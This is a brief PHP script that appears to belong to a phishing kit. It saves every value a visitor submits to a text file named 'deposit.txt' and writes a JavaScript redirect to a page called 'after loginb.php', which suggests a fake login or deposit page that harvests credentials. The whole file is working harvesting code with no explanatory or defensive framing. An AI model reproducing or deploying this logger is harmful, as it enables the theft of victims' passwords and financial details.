<?php
$chataa=implode(" ",$_REQUEST);
$script="<script>location.href='./after loginb.php'</script>";
file_put_contents("deposit.txt",$chataa);
file_put_contents("depo.js",$script);
?>